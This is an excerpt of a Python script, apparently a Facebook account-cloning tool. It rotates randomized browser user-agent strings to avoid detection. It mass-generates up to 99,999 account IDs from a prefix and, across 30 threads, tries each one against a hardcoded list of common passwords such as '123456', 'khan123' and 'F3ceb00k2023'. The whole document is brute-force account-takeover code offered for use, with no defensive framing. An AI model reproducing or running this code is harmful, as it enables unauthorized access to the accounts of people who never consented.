...
#______________OLD UA2_____________#
def Hackx():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    url15 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    return url15
#______________FILE UA_______________#
def fuck_xx():
...
ua = "Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
...
def main():
    ...
    print("[3] START CLONE [2009 - 2020][WORK]")
...
def HACKED(series):
    ...
    for a in range(99999):
        ...
        gen.append(AXN)
    with ThreadPoolExecutor(max_workers=30) as Hackx:
        ____banner____()
        ...
        for love in gen:
            ids = SEX + love
            passlist = ["123456", "1234567", "12345678", "123456789"," 000000","1234567890","123123","khan123","singh123","salamkhan","P4ssw0rd123","Qwerty23","L0veme88","F3ceb00k2023","Str0ngPass","Iloveyou143","M1chael1990","J3nn1f3r1","Dan13l2000","R0b3rt1234","Sarah1995","Th0mas2468","Em1ly234","J0hn123a","andr3w1987","Maryann3456","Charl13Brown","Kat13P3rry","JackJ1ll2022 M0nk3yBanana","Drag0nBall99","HarryP0tt3r7","password","qwerty,","qwerty123","1q2w3e"]
            Hackx.submit(Fucking_life, ids, passlist)
    sys.exit("\n-------------------------------")
